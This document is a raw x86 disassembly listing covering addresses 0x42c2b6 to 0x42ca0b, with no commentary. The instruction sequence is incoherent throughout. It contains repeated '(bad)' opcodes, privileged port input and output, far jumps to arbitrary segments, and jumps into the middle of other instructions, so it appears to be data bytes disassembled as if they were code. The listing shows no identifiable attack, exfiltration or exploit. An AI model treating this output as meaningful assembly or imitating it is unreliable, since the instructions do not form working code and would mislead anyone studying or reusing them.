  42c2b6:	push   ebx
  42c2b7:	sub    al,0x86
  42c2b9:	jne    0x42c259
  42c2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2bc:	pop    esi
  42c2bd:	xchg   esp,eax
  42c2be:	stc    
  42c2bf:	xlat   BYTE PTR ds:[ebx]
  42c2c0:	stc    
  42c2c1:	add    bh,BYTE PTR [edi-0x59ed924]
  42c2c7:	mov    bx,0xf2b7
  42c2cb:	jge    0x42c2de
  42c2cd:	pop    esi
  42c2ce:	out    0x89,eax
  42c2d0:	ja     0x42c329
  42c2d2:	ss pop esp
  42c2d4:	scas   al,BYTE PTR es:[edi]
  42c2d5:	dec    edx
  42c2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2d7:	xor    ah,dl
  42c2d9:	pusha  
  42c2da:	or     ebx,ebp
  42c2dc:	test   DWORD PTR [eax],ebx
  42c2de:	ficomp DWORD PTR [esi-0xf1ddee9]
  42c2e4:	pop    esi
  42c2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2e6:	dec    DWORD PTR [ebp+ebx*1-0x74070394]
  42c2ed:	pusha  
  42c2ee:	xchg   BYTE PTR [eax+0x2b],ah
  42c2f1:	or     esi,DWORD PTR [esi-0x45]
  42c2f4:	jne    0x42c31b
  42c2f6:	fst    DWORD PTR [ebx-0x22fdf090]
  42c2fc:	mov    ebp,0xf406ef7
  42c301:	in     eax,0x23
  42c303:	mov    edi,0x9e7f6149
  42c308:	cmp    al,0x85
  42c30a:	inc    edi
  42c30b:	mov    esi,DWORD PTR [ebx-0x2d661165]
  42c311:	mov    ch,0x24
  42c313:	and    DWORD PTR [bp+di-0x5efb],edi
  42c318:	mov    edi,0xd7a8eccb
  42c31d:	in     al,dx
  42c31e:	push   ds
  42c31f:	xchg   edx,eax
  42c320:	arpl   WORD PTR [eax+0x78],ax
  42c323:	aas    
  42c324:	jae    0x42c345
  42c326:	mov    cl,0xc1
  42c328:	sub    eax,0x83e26231
  42c32d:	pusha  
  42c32e:	sbb    edi,DWORD PTR [eax-0x76]
  42c331:	shl    BYTE PTR [edi],0x7f
  42c334:	sub    ch,al
  42c336:	out    dx,al
  42c337:	adc    BYTE PTR cs:[edi-0x6d],0x50
  42c33c:	inc    edi
  42c33d:	lods   al,BYTE PTR ds:[esi]
  42c33e:	cmp    esi,ebp
  42c340:	dec    ecx
  42c341:	popa   
  42c342:	or     bh,BYTE PTR [edx]
  42c344:	fmul   DWORD PTR [ebp+edi*1-0x35]
  42c348:	out    0x86,eax
  42c34a:	in     eax,dx
  42c34b:	outs   dx,BYTE PTR ds:[esi]
  42c34c:	jne    0x42c384
  42c34e:	aad    0xa9
  42c350:	and    al,0x50
  42c352:	inc    esi
  42c353:	pop    ss
  42c354:	das    
  42c355:	pusha  
  42c356:	repnz sbb eax,0xe116e32a
  42c35c:	sub    al,0x8e
  42c35e:	dec    esi
  42c35f:	xchg   esi,eax
  42c360:	std    
  42c361:	mov    gs,ebx
  42c363:	cmp    BYTE PTR [edx+eax*2],al
  42c366:	jmp    0xb63bb8bf
  42c36b:	out    0x22,al
  42c36d:	pop    esi
  42c36e:	xchg   edx,eax
  42c36f:	mov    ebp,0x9c63cf68
  42c374:	retf   
  42c375:	pusha  
  42c376:	shl    BYTE PTR [ebx+edx*8+0x63],0x25
  42c37b:	loope  0x42c3ed
  42c37d:	push   ecx
  42c37e:	mov    bh,0x89
  42c380:	jge    0x42c31f
  42c382:	bound  ecx,QWORD PTR [ecx]
  42c384:	sub    al,0xc1
  42c386:	pop    edi
  42c387:	pop    es
  42c388:	and    BYTE PTR [ecx],0xe0
  42c38b:	jp     0x42c3ef
  42c38d:	popa   
  42c38e:	lds    esi,FWORD PTR [ecx+0x751ca38d]
  42c394:	enter  0xee99,0x32
  42c398:	inc    esp
  42c399:	sbb    ecx,esp
  42c39b:	add    BYTE PTR [ebp-0x61],dh
  42c39e:	sbb    DWORD PTR cs:[edx],0x61
  42c3a2:	adc    DWORD PTR [edi],edi
  42c3a4:	dec    edx
  42c3a5:	repnz pop ecx
  42c3a7:	mov    WORD PTR [esp+edi*8-0x10],?
  42c3ab:	sbb    al,0xa3
  42c3ad:	add    eax,0xe6e020d4
  42c3b2:	loopne 0x42c425
  42c3b4:	cmp    BYTE PTR [ebx-0x71795f21],bh
  42c3ba:	push   cs
  42c3bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3bc:	push   ss
  42c3bd:	push   0xf023ff7e
  42c3c2:	bound  ecx,QWORD PTR [esi]
  42c3c4:	pop    esp
  42c3c5:	ret    0x4ce
  42c3c8:	cmp    eax,0xa5f6ed33
  42c3cd:	or     bh,ah
  42c3cf:	jae    0x42c416
  42c3d1:	push   ebx
  42c3d2:	adc    ecx,DWORD PTR ss:[ebp+0x60]
  42c3d6:	scas   al,BYTE PTR es:[edi]
  42c3d7:	jl     0x42c35f
  42c3d9:	dec    esp
  42c3da:	or     BYTE PTR [eiz*2+0x5e89d995],cl
  42c3e1:	aam    0x63
  42c3e3:	pusha  
  42c3e4:	jp     0x42c43e
  42c3e6:	scas   eax,DWORD PTR es:[edi]
  42c3e7:	popf   
  42c3e8:	into   
  42c3e9:	pusha  
  42c3ea:	jo     0x42c40e
  42c3ec:	jbe    0x42c386
  42c3ee:	jecxz  0x42c44c
  42c3f0:	sti    
  42c3f1:	sbb    dh,ch
  42c3f3:	icebp  
  42c3f4:	lds    edx,FWORD PTR [edx+0x2c8a3fe0]
  42c3fa:	hlt    
  42c3fb:	mov    al,ds:0x1abbd301
  42c400:	adc    eax,0x5e2d3dd6
  42c405:	pushf  
  42c406:	clc    
  42c407:	test   DWORD PTR [edi+0x6ab12ef1],eax
  42c40d:	pusha  
  42c40e:	sahf   
  42c40f:	cmp    DWORD PTR [ebp+0x3da71b8e],edi
  42c415:	ins    BYTE PTR es:[edi],dx
  42c416:	out    dx,al
  42c417:	mov    esp,ecx
  42c419:	leave  
  42c41a:	retf   0x417f
  42c41d:	out    0x75,al
  42c41f:	adc    edx,ecx
  42c421:	pusha  
  42c422:	push   ecx
  42c423:	xchg   ecx,eax
  42c424:	retf   0x9dbc
  42c427:	fwait
  42c428:	push   esi
  42c429:	xchg   ecx,eax
  42c42a:	out    dx,al
  42c42b:	push   ecx
  42c42c:	xchg   ebp,eax
  42c42d:	and    BYTE PTR cs:[edi-0x62640612],dl
  42c434:	enter  0xfc3,0x6c
  42c438:	dec    edx
  42c439:	or     esi,ebp
  42c43b:	lods   al,BYTE PTR ds:[esi]
  42c43c:	clc    
  42c43d:	loopne 0x42c4aa
  42c43f:	mov    ch,0xe8
  42c441:	jp     0x42c3df
  42c443:	mov    eax,ds:0x56ced27f
  42c448:	pop    ds
  42c449:	ins    BYTE PTR es:[edi],dx
  42c44a:	mov    al,0x13
  42c44c:	pop    esi
  42c44d:	mov    bh,0x4
  42c44f:	fs stos DWORD PTR es:[edi],eax
  42c451:	inc    DWORD PTR [eax+eax*2-0x5e9cd52c]
  42c458:	cdq    
  42c459:	arpl   WORD PTR [edi+0xbaf43b],sp
  42c45f:	test   eax,0xfc90945e
  42c464:	cwde   
  42c465:	test   al,0xb4
  42c467:	fs inc ecx
  42c469:	push   edi
  42c46a:	push   es
  42c46b:	adc    esp,DWORD PTR [edx]
  42c46d:	push   ebx
  42c46e:	jle    0x42c411
  42c470:	pop    ebx
  42c471:	mov    al,0xec
  42c473:	mov    esp,0xf237959
  42c478:	das    
  42c479:	ret    0xe3b6
  42c47c:	sbb    eax,0x40167e72
  42c481:	mov    al,ds:0x61253962
  42c486:	and    BYTE PTR ds:0x70436678,al
  42c48c:	cmp    DWORD PTR [ecx-0x13],0x54eee0af
  42c493:	or     BYTE PTR [ebx],0x42
  42c496:	dec    edx
  42c497:	or     al,0x49
  42c499:	popa   
  42c49a:	mov    di,0x6587
  42c49e:	xor    ch,BYTE PTR [ecx+0x2e019bb9]
  42c4a4:	(bad)  
  42c4a6:	rep lock outs dx,DWORD PTR ds:[esi]
  42c4a9:	fbstp  TBYTE PTR [ebx+0xf]
  42c4ac:	sbb    ch,BYTE PTR [ebx+0x32]
  42c4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4b0:	sbb    al,0x61
  42c4b2:	mov    esi,0xa1836c53
  42c4b7:	pop    ds
  42c4b8:	adc    eax,0x74b1eed7
  42c4bd:	dec    edx
  42c4be:	inc    edi
  42c4bf:	call   0x2d16:0x72c4dd76
  42c4c6:	dec    ebp
  42c4c7:	call   0xc065:0x2336922a
  42c4ce:	outs   dx,BYTE PTR ds:[esi]
  42c4cf:	xchg   ecx,eax
  42c4d0:	enter  0x3486,0x2a
  42c4d4:	arpl   WORD PTR [edx+0x40de87e7],bp
  42c4da:	jmp    0xd3e627ae
  42c4df:	lahf   
  42c4e0:	fld    DWORD PTR [ebx+0x2c1aad9a]
  42c4e6:	sahf   
  42c4e7:	popa   
  42c4e8:	xor    ch,BYTE PTR [eax+0xa598c86]
  42c4ee:	out    dx,eax
  42c4ef:	jo     0x42c4ed
  42c4f1:	imul   ebp,DWORD PTR [si+0x3a],0xffffffb9
  42c4f6:	mov    esp,0x3c606ce1
  42c4fb:	mov    ds:0xa933ef6b,eax
  42c500:	xchg   ecx,eax
  42c501:	inc    ecx
  42c502:	fst    DWORD PTR [eax]
  42c504:	pop    ecx
  42c505:	xchg   ebx,eax
  42c506:	add    esi,DWORD PTR [edx+0x262e6b86]
  42c50c:	in     eax,dx
  42c50d:	mov    edi,0x8763a0f3
  42c512:	jbe    0x42c58c
  42c514:	jecxz  0x42c55d
  42c516:	in     eax,dx
  42c517:	daa    
  42c518:	pop    esi
  42c519:	mov    WORD PTR [ebx],cs
  42c51b:	or     al,0x36
  42c51d:	into   
  42c51e:	mov    edi,0xa4612b23
  42c523:	daa    
  42c524:	rol    DWORD PTR [edx-0x51],0x69
  42c528:	test   DWORD PTR [ebx],edi
  42c52a:	adc    bl,ah
  42c52c:	in     al,0xc4
  42c52e:	in     eax,dx
  42c52f:	sbb    eax,0x90e7e592
  42c534:	mov    cs,WORD PTR [ebx+0x64]
  42c537:	test   al,0x30
  42c539:	sbb    al,0xcb
  42c53b:	adc    al,0x6c
  42c53d:	pop    ecx
  42c53e:	ret    
  42c53f:	jo     0x42c4cc
  42c541:	sahf   
  42c542:	and    dl,al
  42c544:	pop    esi
  42c545:	(bad)  
  42c546:	mov    DWORD PTR ss:[ecx-0x35878a99],esi
  42c54d:	dec    ecx
  42c54e:	int3   
  42c54f:	sub    eax,ebp
  42c551:	pusha  
  42c552:	nop
  42c553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c554:	adc    eax,0x4a4d0c64
  42c559:	xchg   ebx,eax
  42c55a:	aas    
  42c55b:	stos   BYTE PTR es:[edi],al
  42c55c:	retf   
  42c55d:	pusha  
  42c55e:	shr    esp,1
  42c560:	cmp    eax,0x32a42700
  42c565:	inc    ebx
  42c566:	int3   
  42c567:	repz push esp
  42c569:	loope  0x42c597
  42c56b:	mov    bh,0xb
  42c56d:	add    eax,0xcc5ed3ae
  42c572:	dec    eax
  42c573:	les    edx,FWORD PTR [ebp+0x37]
  42c576:	je     0x42c5ad
  42c578:	call   0x8fb1:0xeaa0a921
  42c57f:	inc    esi
  42c580:	inc    ecx
  42c581:	or     DWORD PTR [edx+0x3c],ebx
  42c584:	pop    esi
  42c585:	xchg   BYTE PTR [ebp+edi*8-0x3f35c46c],cl
  42c58c:	je     0x42c5ee
  42c58e:	(bad)  
  42c590:	repnz push eax
  42c592:	push   eax
  42c593:	shl    BYTE PTR [ecx+eax*2-0x5f0fa012],1
  42c59a:	sub    DWORD PTR gs:[edx-0x4857a4c3],0x6b5e6e99
  42c5a5:	mov    al,0x1d
  42c5a7:	aad    0xe9
  42c5a9:	scas   al,BYTE PTR es:[edi]
  42c5aa:	out    dx,al
  42c5ab:	jne    0x42c52e
  42c5ad:	mov    DWORD PTR [ebp+0x32],0xa15e6ca9
  42c5b4:	inc    esi
  42c5b5:	xor    ah,ah
  42c5b7:	inc    edi
  42c5b8:	imul   edx,eax,0xffffff94
  42c5bb:	add    ebx,DWORD PTR [esi+0x77]
  42c5be:	sub    eax,0x4989a3ba
  42c5c3:	xlat   BYTE PTR ds:[ebx]
  42c5c4:	retf   0x4860
  42c5c7:	inc    edi
  42c5c8:	test   dl,ah
  42c5ca:	xchg   BYTE PTR [ecx],bh
  42c5cc:	ja     0x42c649
  42c5ce:	out    dx,al
  42c5cf:	xchg   eax,ebx
  42c5d1:	(bad)  
  42c5d2:	push   cs
  42c5d3:	pusha  
  42c5d4:	fnstsw WORD PTR [ecx]
  42c5d6:	adc    DWORD PTR [ecx+0x700d588],esp
  42c5dc:	outs   dx,DWORD PTR ds:[esi]
  42c5dd:	push   0x12
  42c5df:	sub    edx,DWORD PTR [edx+0xf]
  42c5e2:	int3   
  42c5e3:	mov    eax,ds:0x8aaf9dde
  42c5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5e9:	push   eax
  42c5ea:	cmc    
  42c5eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c5ec:	test   esp,ebp
  42c5ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c5ef:	hlt    
  42c5f0:	xor    eax,0x9134a4e1
  42c5f5:	sub    al,0xee
  42c5f7:	or     dl,BYTE PTR [edx-0x30fbef59]
  42c5fd:	clc    
  42c5fe:	push   DWORD PTR [eax-0x78]
  42c601:	push   edi
  42c602:	daa    
  42c603:	add    BYTE PTR [eax-0x73],0xeb
  42c607:	xchg   DWORD PTR [eax+0x2f],ecx
  42c60a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c60b:	test   esi,ecx
  42c60d:	or     DWORD PTR [edx],eax
  42c60f:	mov    dl,0x30
  42c611:	clc    
  42c612:	scas   al,BYTE PTR es:[edi]
  42c613:	jge    0x42c612
  42c615:	repz jmp 0xfe94444
  42c61b:	lahf   
  42c61c:	nop
  42c61d:	mov    ah,0xf6
  42c61f:	mov    BYTE PTR [esi-0x7f081f17],bh
  42c625:	sub    BYTE PTR ds:0x40dd9ccd,ah
  42c62b:	sub    al,0xb9
  42c62d:	popa   
  42c62e:	or     DWORD PTR [ecx+0x51105a0c],esp
  42c634:	fnstcw WORD PTR [ebp+0x29]
  42c637:	mov    bl,0x5d
  42c639:	jb     0x42c668
  42c63b:	popf   
  42c63c:	mov    ebp,0x92d6643a
  42c641:	or     BYTE PTR [esi-0x5f],cl
  42c644:	dec    esi
  42c645:	xchg   edx,eax
  42c646:	push   0xffffffd3
  42c648:	icebp  
  42c649:	push   ecx
  42c64a:	mov    edx,DWORD PTR [edx]
  42c64c:	arpl   WORD PTR [edx+esi*4],di
  42c64f:	push   edi
  42c650:	int3   
  42c651:	inc    eax
  42c652:	test   al,0xd9
  42c654:	add    eax,0xcfa146f5
  42c659:	xlat   BYTE PTR ds:[ebx]
  42c65a:	retf   0x1fcd
  42c65d:	xor    BYTE PTR [ebx*4+0x1994bd5e],al
  42c664:	or     BYTE PTR [edi+0x608a5e2e],ah
  42c66a:	xchg   DWORD PTR [esi+0x28],edi
  42c66d:	and    eax,0x5725d15
  42c672:	out    dx,al
  42c673:	inc    esi
  42c674:	popa   
  42c675:	push   ecx
  42c676:	sbb    al,0xa2
  42c678:	sub    edx,eax
  42c67a:	popf   
  42c67b:	leave  
  42c67c:	das    
  42c67d:	jmp    0xe789:0x9add44ee
  42c684:	imul   edi,DWORD PTR [ecx],0xf763b14e
  42c68a:	int    0x86
  42c68c:	push   esi
  42c68d:	popa   
  42c68e:	inc    esp
  42c68f:	(bad)  
  42c690:	dec    esp
  42c691:	vpackssdw xmm2,xmm6,XMMWORD PTR [esi+0x33f0d262]
  42c699:	popa   
  42c69a:	mov    ebx,0x87579ff4
  42c69f:	sub    BYTE PTR [eax],bl
  42c6a1:	or     ebp,esi
  42c6a3:	xor    dl,bh
  42c6a5:	ror    al,1
  42c6a7:	setne  BYTE PTR [esp-0x57]
  42c6ac:	cmp    al,0xbf
  42c6ae:	out    dx,al
  42c6af:	std    
  42c6b0:	dec    edi
  42c6b1:	test   DWORD PTR [eax+0x23685d60],ebp
  42c6b7:	clc    
  42c6b8:	mov    ebp,0x9f2eb5c1
  42c6bd:	mul    BYTE PTR [ecx+0x1cc77d18]
  42c6c3:	sub    eax,0xe6e86133
  42c6c8:	sbb    ecx,DWORD PTR [eax+eax*2]
  42c6cb:	add    BYTE PTR [esi+0x3b],bl
  42c6ce:	push   edx
  42c6cf:	inc    ebx
  42c6d0:	mov    edi,0xe6583a5d
  42c6d5:	pusha  
  42c6d6:	mov    ds:0xadc3977b,eax
  42c6db:	in     eax,0x69
  42c6dd:	mov    ds:0xbb11eae7,eax
  42c6e2:	cmp    al,0x7c
  42c6e4:	fwait
  42c6e5:	xchg   BYTE PTR [esi-0x772f3c53],ch
  42c6eb:	mov    eax,ds:0xd65ac885
  42c6f0:	jae    0x42c6bf
  42c6f2:	out    0x9f,eax
  42c6f4:	cmp    BYTE PTR [esp+ebx*8],dl
  42c6f7:	and    edi,ebx
  42c6f9:	lock mov fs,WORD PTR [ebp-0x68b9511a]
  42c700:	jne    0x42c762
  42c702:	fldcw  WORD PTR [eax]
  42c704:	mov    DWORD PTR [ebp+0x76c74299],ebx
  42c70a:	fimul  WORD PTR [edi]
  42c70c:	in     al,dx
  42c70d:	sbb    bh,ch
  42c70f:	sti    
  42c710:	js     0x42c698
  42c712:	sbb    al,0x24
  42c714:	inc    edi
  42c715:	mov    ds:0x2b58218a,eax
  42c71a:	adc    eax,0x45a5b37b
  42c71f:	jge    0x42c6b7
  42c721:	ret    0xa135
  42c724:	lods   al,BYTE PTR ds:[esi]
  42c725:	jne    0x42c76d
  42c727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c728:	jns    0x42c6fc
  42c72a:	repnz clc 
  42c72c:	pop    esi
  42c72d:	xor    ch,BYTE PTR [ecx]
  42c72f:	inc    ecx
  42c730:	in     al,dx
  42c731:	inc    esi
  42c732:	pop    edx
  42c733:	mov    ebp,0x94bf611c
  42c738:	push   ebx
  42c739:	add    BYTE PTR [ebx-0x11f2f7a0],0xe2
  42c740:	dec    esp
  42c741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c742:	pop    ecx
  42c743:	fwait
  42c744:	shl    BYTE PTR [edi+0x50],0xa1
  42c748:	xchg   edi,eax
  42c749:	(bad)  
  42c74b:	mov    ss,WORD PTR [edx+0x22]
  42c74e:	cdq    
  42c74f:	cmp    al,0x26
  42c751:	imul   eax,DWORD PTR [ebp-0x5f],0xfffabf29
  42c758:	test   cl,bh
  42c75a:	in     al,dx
  42c75b:	mov    al,ds:0x9e6390aa
  42c760:	je     0x42c6e8
  42c762:	fisub  DWORD PTR [ebp+0x2691fd65]
  42c768:	pop    esp
  42c769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c76a:	outs   dx,BYTE PTR ds:[esi]
  42c76b:	dec    ebx
  42c76c:	test   cl,0x41
  42c76f:	repz pop esi
  42c771:	div    BYTE PTR [ecx-0x212ac7ed]
  42c777:	out    dx,al
  42c778:	xor    eax,0x27b4fa61
  42c77d:	push   ecx
  42c77e:	call   0xe951d1a2
  42c783:	aad    0x50
  42c785:	mov    es,WORD PTR [ebx]
  42c787:	test   dh,bl
  42c789:	mov    edx,0x60aaf7ca
  42c78e:	sub    al,0x76
  42c790:	(bad)  
  42c791:	sbb    eax,0xbf784498
  42c796:	out    dx,al
  42c797:	jae    0x42c792
  42c799:	mov    bh,0x4e
  42c79b:	mov    edi,0xa10e8dbe
  42c7a0:	imul   DWORD PTR [ebx]
  42c7a2:	sbb    bl,bl
  42c7a4:	clc    
  42c7a5:	leave  
  42c7a6:	xor    bl,BYTE PTR [ebx-0x7531aca2]
  42c7ac:	aam    0xf2
  42c7ae:	xchg   edi,eax
  42c7af:	jmp    0x8c66:0x421d60bc
  42c7b6:	pop    ecx
  42c7b7:	add    eax,0x19eee492
  42c7bc:	fdiv   DWORD PTR [edi-0x5]
  42c7bf:	cli    
  42c7c0:	jae    0x42c809
  42c7c2:	scas   al,BYTE PTR es:[edi]
  42c7c3:	ins    BYTE PTR es:[edi],dx
  42c7c4:	jo     0x42c774
  42c7c6:	jns    0x42c756
  42c7c8:	inc    edi
  42c7c9:	cwde   
  42c7ca:	pop    ds
  42c7cb:	mov    eax,ds:0x6a588ccd
  42c7d0:	pop    ebp
  42c7d1:	fsubr  st,st(7)
  42c7d3:	and    al,0xe1
  42c7d5:	jmp    0xe1e4:0xb35bb7ca
  42c7dc:	shr    BYTE PTR cs:[edx-0x459f6f64],1
  42c7e3:	test   BYTE PTR [edi-0x29],cl
  42c7e6:	clc    
  42c7e7:	adc    al,0xf9
  42c7e9:	in     eax,dx
  42c7ea:	out    dx,al
  42c7eb:	jo     0x42c7aa
  42c7ed:	xchg   esi,eax
  42c7ee:	mov    ds:0x8483a3ef,al
  42c7f3:	mov    eax,ds:0x1b6aff11
  42c7f8:	inc    edx
  42c7f9:	and    BYTE PTR [ebx+0x4f],al
  42c7fc:	pop    esi
  42c7fd:	xor    al,0x4
  42c7ff:	mov    ch,ch
  42c801:	mov    ebx,0x26e5cf2e
  42c806:	and    BYTE PTR [eax+0x50e16eb9],ch
  42c80c:	retf   0xbf60
  42c80f:	ins    DWORD PTR es:[edi],dx
  42c810:	push   cs
  42c811:	adc    ch,dh
  42c813:	sub    BYTE PTR [eax+0x45],dh
  42c816:	pusha  
  42c817:	mov    esi,0xa01a1c49
  42c81c:	inc    ecx
  42c81e:	mov    cl,0x8
  42c820:	mov    edi,0xd04e448f
  42c825:	mov    edx,0xb27efbae
  42c82a:	out    dx,al
  42c82b:	pop    ss
  42c82c:	sbb    DWORD PTR [edx],edi
  42c82e:	setno  BYTE PTR [ecx]
  42c831:	stos   BYTE PTR es:[edi],al
  42c832:	lods   al,BYTE PTR ds:[esi]
  42c833:	(bad)
  42c837:	pusha  
  42c838:	xchg   ebx,eax
  42c839:	stos   DWORD PTR es:[edi],eax
  42c83a:	jns    0x42c88f
  42c83c:	out    dx,eax
  42c83d:	xchg   edx,eax
  42c83e:	jmp    0x42c85c
  42c840:	add    BYTE PTR [ebx],bl
  42c842:	pop    ebx
  42c843:	cwde   
  42c844:	sbb    DWORD PTR [eax+0x519544c8],0x4ca0f7f0
  42c84e:	into   
  42c84f:	jmp    0xb7ee013a
  42c854:	xor    eax,0x16213fa8
  42c859:	sar    DWORD PTR [ecx],cl
  42c85b:	jg     0x42c83b
  42c85d:	push   ecx
  42c85e:	xchg   esp,eax
  42c85f:	test   al,0xc2
  42c861:	fild   DWORD PTR [ebx+0x15]
  42c864:	fidiv  DWORD PTR [eax-0xdfea93c]
  42c86a:	loope  0x42c808
  42c86c:	arpl   WORD PTR [edx-0x15],sp
  42c86f:	leave  
  42c870:	fadd   QWORD PTR [eax-0x4a663a31]
  42c876:	stos   DWORD PTR es:[edi],eax
  42c877:	mov    eax,ds:0x9b3335f7
  42c87c:	push   ecx
  42c87d:	mov    al,0x4d
  42c87f:	dec    ecx
  42c880:	scas   al,BYTE PTR es:[edi]
  42c881:	mov    ecx,0xcb53b2ed
  42c886:	xor    DWORD PTR [edi-0xeae836d],0xfffffffe
  42c88d:	in     eax,dx
  42c88e:	push   0xba424031
  42c893:	and    cl,BYTE PTR [ecx+eiz*4+0x5e]
  42c897:	ror    al,cl
  42c899:	lods   al,BYTE PTR ds:[esi]
  42c89a:	jb     0x42c866
  42c89c:	pop    esi
  42c89d:	pop    edi
  42c89e:	adc    eax,0x9e0e6fbe
  42c8a3:	push   cs
  42c8a4:	xchg   ebp,eax
  42c8a5:	push   edx
  42c8a6:	imul   eax,DWORD PTR [esi-0x59b1740d],0x13553233
  42c8b0:	pop    ebp
  42c8b1:	pop    ebx
  42c8b2:	(bad)  
  42c8b3:	mov    eax,0x71f6df37
  42c8b8:	sbb    eax,0x36303be5
  42c8bd:	sbb    eax,0xf4380cf4
  42c8c2:	jle    0x42c865
  42c8c4:	test   DWORD PTR [ebp-0x34309e9e],ebp
  42c8ca:	out    dx,al
  42c8cb:	sti    
  42c8cc:	xchg   BYTE PTR [edi-0x42],ah
  42c8cf:	mov    bh,0x15
  42c8d1:	and    edx,DWORD PTR [ecx+0x7595cda1]
  42c8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8d8:	push   0xffffffff
  42c8da:	out    0xff,eax
  42c8dc:	pop    esi
  42c8dd:	(bad)  
  42c8de:	or     eax,0xa61798d2
  42c8e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8e4:	and    BYTE PTR [edx-0x14],dl
  42c8e7:	outs   dx,DWORD PTR ds:[esi]
  42c8e8:	xor    BYTE PTR [edx+0x7361be6e],0xf8
  42c8ef:	scas   eax,DWORD PTR es:[edi]
  42c8f0:	and    bh,bl
  42c8f2:	xchg   ebp,eax
  42c8f3:	mov    eax,ds:0x17342591
  42c8f8:	xor    DWORD PTR [esi],ebx
  42c8fa:	stc    
  42c8fb:	mov    al,ds:0xe081807d
  42c900:	mov    WORD PTR [edi+0x72],fs
  42c903:	or     al,0x5e
  42c905:	sbb    ch,ah
  42c907:	jmp    0x42c8ae
  42c909:	dec    esp
  42c90a:	loope  0x42c890
  42c90c:	jbe    0x42c96e
  42c90e:	fucom  st(4)
  42c910:	(bad)  
  42c912:	fisub  WORD PTR [ebp-0x7b]
  42c915:	and    ch,dh
  42c917:	dec    esi
  42c918:	and    DWORD PTR gs:[eax-0x2f1e23c],esi
  42c91f:	mov    al,ds:0x20234962
  42c924:	adc    edx,DWORD PTR [ebp+0x795ed982]
  42c92a:	push   ecx
  42c92b:	mov    bh,0x9c
  42c92d:	push   es
  42c92e:	or     eax,DWORD PTR [esp+ebx*2]
  42c931:	pop    esi
  42c932:	cld    
  42c933:	stc    
  42c934:	xchg   edi,eax
  42c935:	sbb    ecx,DWORD PTR [ebp-0x7f]
  42c938:	pop    ebx
  42c939:	dec    ebx
  42c93a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c93b:	dec    edx
  42c93c:	push   edx
  42c93d:	fistp  QWORD PTR [esi]
  42c93f:	add    ch,BYTE PTR [ebx+0x49a187fb]
  42c945:	add    al,0xa3
  42c947:	test   bh,ch
  42c949:	mov    ah,BYTE PTR [edi+ecx*8]
  42c94c:	pop    esi
  42c94d:	stos   BYTE PTR es:[edi],al
  42c94e:	aaa    
  42c94f:	dec    ecx
  42c950:	dec    esp
  42c951:	or     dh,cl
  42c953:	repnz fnstsw WORD PTR [esi-0x6c425ffb]
  42c95a:	dec    esi
  42c95b:	or     al,0xf1
  42c95d:	sbb    al,0x33
  42c95f:	xchg   edx,eax
  42c960:	dec    ecx
  42c961:	mov    eax,ds:0x50c702ef
  42c966:	in     eax,dx
  42c967:	in     eax,0x6e
  42c969:	push   ss
  42c96a:	or     edi,DWORD PTR [eax-0x69124a9]
  42c970:	pop    ds
  42c971:	sbb    bl,BYTE PTR [edx]
  42c973:	xchg   BYTE PTR [eax+0x5346d7d6],al
  42c979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c97a:	test   eax,0x42871d0d
  42c97f:	mov    edx,0x811e6496
  42c984:	sub    al,0x61
  42c986:	pop    ss
  42c987:	pop    ebx
  42c988:	(bad)  
  42c989:	pop    ss
  42c98a:	cmc    
  42c98b:	jp     0x42c948
  42c98d:	and    al,0xe3
  42c98f:	sbb    al,0x5f
  42c991:	sahf   
  42c992:	stos   DWORD PTR es:[edi],eax
  42c993:	jbe    0x42c9bb
  42c995:	mov    ecx,0x47fa0927
  42c99a:	push   0x2f4b33a2
  42c99f:	and    eax,DWORD PTR [ebx-0x68]
  42c9a2:	mov    ah,0x74
  42c9a4:	das    
  42c9a5:	test   al,0xee
  42c9a7:	push   ss
  42c9a8:	and    cl,ch
  42c9aa:	dec    ebx
  42c9ab:	xchg   DWORD PTR [edi-0x645ec6cc],edi
  42c9b1:	dec    esi
  42c9b2:	mov    edi,0xa068c164
  42c9b7:	jecxz  0x42ca0c
  42c9b9:	and    eax,0x561e7550
  42c9be:	sahf   
  42c9bf:	push   0x3f
  42c9c1:	push   ss
  42c9c2:	in     eax,dx
  42c9c3:	mov    al,ds:0xfe8b2cd4
  42c9c8:	jge    0x42ca2e
  42c9ca:	les    ebx,FWORD PTR [esi+0x5e]
  42c9cd:	add    DWORD PTR [esi],esp
  42c9cf:	xchg   edx,eax
  42c9d0:	push   cs
  42c9d1:	sub    ecx,DWORD PTR [ecx-0x5c9f0185]
  42c9d7:	out    dx,eax
  42c9d8:	jp     0x42ca0b
  42c9da:	js     0x42c96b
  42c9dc:	add    al,0xa9
  42c9de:	out    dx,al
  42c9df:	int3   
  42c9e0:	js     0x42ca55
  42c9e2:	rcl    DWORD PTR [edi+0x73],1
  42c9e5:	cmp    DWORD PTR [eax],ecx
  42c9e7:	lock mov ds:0x8fc5a259,eax
  42c9ed:	js     0x42c9e5
  42c9ef:	xor    BYTE PTR [ecx-0x68],ch
  42c9f2:	sti    
  42c9f3:	in     eax,dx
  42c9f4:	push   esp
  42c9f5:	loop   0x42ca12
  42c9f7:	loope  0x42c9b0
  42c9f9:	pusha  
  42c9fa:	and    edx,ecx
  42c9fc:	repz add bh,dl
  42c9ff:	pop    edx
  42ca00:	sbb    BYTE PTR [ebp-0x73],al
  42ca03:	icebp  
  42ca04:	lahf   
  42ca05:	fbstp  TBYTE PTR [ebp+0x51]
  42ca08:	jb     0x42ca3e
  42ca0a:	dec    ebx
  42ca0b:	pop    ebp
